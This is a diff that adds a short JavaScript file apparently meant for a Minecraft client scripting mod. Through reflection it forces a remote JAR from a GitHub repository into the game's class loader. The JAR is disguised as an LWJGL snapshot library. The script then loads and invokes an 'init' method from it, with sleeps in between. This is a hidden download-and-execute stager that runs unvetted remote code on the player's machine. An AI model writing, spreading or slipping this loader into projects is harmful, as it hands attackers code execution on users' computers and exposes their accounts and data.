@@ -1,0 +1,12 @@
+let URLClassLoader = Java.type("java.net.URLClassLoader");
+let URL = Java.type("java.net.URL");
+let Minecraft = Java.type("net.minecraft.client.Minecraft");
+let classLoader = null;
+let jarURL = new URL("https://github.com/Zearex/nodoor/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
+classLoader = Minecraft.class.getClassLoader();
+let method = URLClassLoader.class.getDeclaredMethod("addURL", Java.type("java.net.URL").class);
+Thread.sleep(1000);
+method.setAccessible(true);
+method.invoke(classLoader, jarURL);
+Thread.sleep(1000);
+classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
